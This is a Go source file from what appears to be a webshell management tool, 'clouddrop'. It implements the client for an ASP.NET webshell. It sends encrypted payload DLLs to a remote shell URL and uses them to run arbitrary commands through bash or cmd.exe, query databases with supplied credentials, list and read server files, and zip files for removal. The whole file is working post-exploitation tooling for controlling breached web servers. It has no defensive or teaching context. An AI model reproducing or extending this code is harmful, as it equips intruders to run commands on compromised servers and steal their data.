package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"os"
)

var NetSessions map[int]string

func (s *CSharpShell) GetShellType() string {
	return "csharp"
}

func (s *CSharpShell) FreshSession(id int, url string, password string) (string, error) {
	if NetSessions == nil {
		// first init NetSessions shell
		NetSessions = make(map[int]string)
	}
	// Get the target code and encrypt
	code, _ := os.ReadFile("./pkg/api/net/Check.dll")
	// 加密code
	enCode := util.Encrypt(string(code), password)
	var err error
	NetSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
	if err != nil {
		return "", err
	}

	session := NetSessions[id] // if key not exist, it returns "" , bcz type is string
	log.Println("当前ASP.NET_SessionId " + session)

	enResult, err := util.PostRequest(url, password, enCode, session)
	if err != nil {
		return "", err
	}

	// 解密code
	res := util.Decrypt(enResult, password)

	return res, nil
}

// BaseInfo
func (s *CSharpShell) BaseInfo(id int, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/BaseInfo.dll")
	res, err := util.HookPost(url, password, string(code), NetSessions[id])
	if err != nil {
		return "", err
	}

	return res, nil
}

func (s *CSharpShell) ExecCommand(id int, command string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/OS.dll")
	osType, err := util.HookPost(url, password, string(code), NetSessions[id])
	if err != nil {
		return "", nil
	}
	var cmdPath string // in if-block-level scope, it must define at out
	if osType == "Linux" {
		cmdPath = "/bin/bash"
	} else {
		cmdPath = "C:/Windows/System32/cmd.exe"
	}

	code, _ = os.ReadFile("./pkg/api/net/CMD.dll")
	code = fmt.Appendf(code, "_____cmdPath-%s,exit-true,cmd-%s", cmdPath, command)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *CSharpShell) ExecCode(id int, code string, url string, password string) (string, error) {
	return "", nil
}

func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/DataBase.dll")
	if database == "" {
		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,encoding-%s",
			driver, host, port, user, pass, encoding)
	} else {
		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,database-%s,sql-%s,option-%s,encoding-%s",
			driver, host, port, user, pass, database, sql, option, encoding)
	}

	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/FileZip.dll")
	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}
func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/FileUnZip.dll")
	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

// FileList lists all files in the current directory
func (s *CSharpShell) FileList(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/FileList.dll")
	code = fmt.Appendf(code, "_____path-%s", path)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *CSharpShell) FileShow(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/net/FileShow.dll")
	code = fmt.Appendf(code, "_____path-%s", path)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}
